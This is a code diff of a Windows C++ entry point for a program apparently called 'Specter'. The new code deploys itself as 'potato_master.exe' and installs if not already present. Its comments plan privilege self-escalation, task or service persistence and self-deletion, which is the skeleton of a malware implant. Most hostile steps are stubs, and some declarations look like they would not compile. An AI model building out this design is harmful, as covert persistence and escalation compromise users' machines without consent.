@@ -1,23 +1,35 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
+#include "SpecterBasicDeployment.hpp"
+#include "SpecterLib/SelfProcessUtils.hpp"
 
-int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int)
+
+int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
 {
-	static constexpr int MyInt = 5;
+	static constexpr std::wstring kProgramName = L"potato_master";
+	static constexpr std::wstring kProgramPath = kProgramName + L".exe";
 
-	return MyInt;
+	if (SelfProcessUtils::IsProcessElevated())
+	{
+		// TODO Admin Install Mode and then Exit
+	}
+	else if (false) // Attempt self escalation if not already attempted once
+	{
+		// TODO Self Escalation Code
+		// Run self with priveleges
+		// If successful, exit, if failed, continue to basic deployment
+	}
 
-	// Check if running in AdminRightsEscalation mode
-	
-	// Step #1 - Determine if ShouldInstall
+	// Deploy as normal user
+	SpecterBasicDeployment deployement(kProgramName, kProgramPath);
 
-	// Step #2 - Check if running with admin rights
-	//		2.1 - If running with admin rights, install with Admin Rights Persistency mode (As Task / Service)
+	if (!deployement.IsInstalled())
+	{
+		deployement.Install();
+	}
 
-	// Step #3 - Attempt to run self with escalation, if successful, wait for the child to terminate and then terminate self
+	// TODO Delete Self code ?
 
-	// Step #4 - If failed to escalate, make program persist without admin rights.
-
-	// Step #5 - Delete Self
+	return 0;
 }
